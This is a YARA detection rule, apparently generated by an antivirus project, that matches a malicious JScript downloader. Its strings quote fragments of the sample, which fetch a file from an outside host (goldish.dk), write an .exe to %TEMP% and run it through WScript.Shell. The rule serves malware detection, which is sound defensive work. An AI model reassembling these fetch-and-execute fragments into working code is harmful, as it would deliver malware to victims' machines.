rule sig_20160330_a740f9bfe4b7376385ce9caf28574e3b {
  meta:
    description = "datamaliciousorder - file 20160330_a740f9bfe4b7376385ce9caf28574e3b.js"
    author      = "HydraDragonAntivirus"
    reference   = "https://github.com/HydraDragonAntivirus"
    date        = "2026-04-26"
    hash1       = "57291b1c387fc3e1437d48ad68d1be9796bd80543b17f8948876067dcedeed51"

  strings:
    $s1  = "_TQ[_D](\"GET\", \"http://goldish.dk/o2pds\", false);" fullword ascii
    $s2  = "var _WS = function _GW() {return WScript[_UL](\"WScript\"+\".Shell\");}(), _Z = 11;" fullword ascii
    $s3  = "function _N(_LP, _WU){_K0 = _K0 * 1; return _LP - _WU;};" fullword ascii
    $s4  = "if (_TQ[\"readystate\"] < 2 * 2) continue;" fullword ascii
    $s5  = "function _J(){return _ZV + \"\";};" fullword ascii
    $s6  = "function _JY() {return _WS[\"ExpandEnvironmentStrings\"](\"%TE\"+\"MP%/\") + \"9FxP6tyKAo.ex\" + \"e\";};" fullword ascii
    $s7  = "function _C() {return ((_B0 == true) && (_B0 == _W)) ? 1 : _K0;};" fullword ascii
    $s8  = "function _WQ(_BX){_WS[\"Run\"](_BX, _K0, _K0);};" fullword ascii
    $s9  = " while (_H){" fullword ascii
    $s10 = "var _YE = new this[\"Date\"]();" fullword ascii
    $s11 = "function _GZ(){return 22;};" fullword ascii
    $s12 = "function _KA(_CL) {var _DY = (1, 2, 3, 4, 5, _CL); return _DY;};" fullword ascii
    $s13 = "function _YO()" fullword ascii
    $s14 = "function _JY0(){return _UL;};" fullword ascii
    $s15 = "return _N(_T, _Y);" fullword ascii
    $s16 = "_W = true; " fullword ascii
    $s17 = "var _B0 = false;" fullword ascii
    $s18 = "_B0 = true; " fullword ascii
    $s19 = "var _FC = false;" fullword ascii
    $s20 = "} catch(_G){};" fullword ascii

  condition:
    uint16(0) == 0x6176 and
    8 of them
}